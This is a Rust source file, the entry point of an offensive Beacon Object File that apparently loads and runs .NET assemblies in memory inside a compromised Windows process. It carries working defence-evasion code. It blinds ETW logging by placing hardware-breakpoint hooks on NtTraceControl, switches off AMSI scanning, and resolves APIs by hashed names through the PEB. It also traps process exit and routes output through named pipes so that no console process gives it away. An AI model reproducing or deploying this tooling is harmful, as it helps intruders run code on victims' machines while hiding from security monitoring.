//! Senjata-Execute-Assembly BOF — entry point.
#![no_std]

pub mod args;
#[cfg(target_os = "windows")]
pub mod cleanup;
#[cfg(target_os = "windows")]
pub mod clr;
#[cfg(target_os = "windows")]
pub mod clr_netfx;
#[cfg(target_os = "windows")]
pub mod clr_core;
#[cfg(target_os = "windows")]
pub mod error;
#[cfg(target_os = "windows")]
pub mod io;
pub mod pe_parser;

#[rustbof::main]
fn main(args: *mut u8, len: usize) {
    #[cfg(target_os = "windows")]
    {
        match run(args, len) {
            Ok(()) => rustbof::eprintln!("[+] senjata-execute-assembly finished"),
            Err(e) => rustbof::eprintln!("[-] {}", e.format()),
        }
    }
    #[cfg(not(target_os = "windows"))]
    {
        let _ = (args, len);
    }
}

#[cfg(target_os = "windows")]
fn run(raw_args: *mut u8, len: usize) -> Result<(), error::BofError> {
    use error::BofError;
    let a = args::parse(raw_args, len).map_err(BofError::Args)?;
    unsafe {
        // NOTE: We do NOT call AllocConsole here. On Win10+ AllocConsole
        // spawns `conhost.exe` as a child process, which is visible in
        // the process tree and may trigger child-process injection if
        // the operator has spawnto persistence configured. Instead, we
        // rely on `io::IoChannel` to SetStdHandle to a named pipe before
        // CLR initialization — Console.WriteLine writes to that handle
        // without ever needing a console window object.
        //
        // Multi-file mode (a.mode == 1) skips PE parsing — the input is a
        // bundle, not a single assembly. Caller is responsible for binary
        // compatibility. Single-file mode parses normally.
        let asm_info = if a.mode == 1 {
            pe_parser::AsmInfo { runtime: pe_parser::Runtime::NetFx4 }
        } else {
            pe_parser::parse(&a.asm_bytes).map_err(|e| match e {
                pe_parser::Error::MixedMode => BofError::MixedModeUnsupported,
                pe_parser::Error::ArchMismatch => BofError::ArchMismatch,
                pe_parser::Error::TargetFrameworkUnknown => BofError::TargetFrameworkUnknown,
                other => BofError::PeParse(other),
            })?
        };

        let engine = opsec_hwbp::HwbpEngine::init().map_err(BofError::Hwbp)?;
        let _etw = if a.etw {
            let ntdll_h = opsec_strcrypt::hash!("ntdll.dll");
            let exp_h = opsec_strcrypt::hash!("NtTraceControl");
            let target = opsec_peb::resolve_module(ntdll_h)
                .and_then(|m| opsec_peb::resolve_export(m, exp_h))
                .ok_or(BofError::PebResolve {
                    module_hash: ntdll_h,
                    export_hash: exp_h,
                })?;
            Some(
                engine
                    .install_rip_ret(target as usize, 0)
                    .map_err(BofError::Hwbp)?,
            )
        } else {
            None
        };

        let io_ch = io::IoChannel::open(a.mailslot, &a.slot_name, &a.pipe_name)?;

        let _amsi = if a.amsi {
            Some(engine.install_amsi_set().map_err(BofError::Hwbp)?)
        } else {
            None
        };

        // save_cleanup_point acts like setjmp: exit-trap VEH redirects back here.
        let mut invoked = false;
        let (resume_rip, resume_rsp) = cleanup::save_cleanup_point();
        if !invoked {
            invoked = true;

            let ntdll_h = opsec_strcrypt::hash!("ntdll.dll");
            let exit_h = opsec_strcrypt::hash!("RtlExitUserProcess");
            let exit_target = opsec_peb::resolve_module(ntdll_h)
                .and_then(|m| opsec_peb::resolve_export(m, exit_h))
                .ok_or(BofError::PebResolve {
                    module_hash: ntdll_h,
                    export_hash: exit_h,
                })?;
            let _exit_trap = engine
                .install_exit_trap(exit_target as usize, 2, resume_rip, resume_rsp)
                .map_err(BofError::Hwbp)?;

            let dispatch_result = clr::dispatch(
                &asm_info, &a.asm_bytes,
                &a.app_domain, &a.asm_args, a.entry_point,
                a.mode, &a.main_name,
            );
            // Always drain stdout, even on error — the assembly may have
            // printed diagnostic info before throwing.
            if let Ok(output) = io_ch.drain() {
                if !output.is_empty() {
                    rustbof::eprintln!("\n{}", output);
                }
            }
            dispatch_result?;
        }
        let _ = invoked;
    }
    Ok(())
}
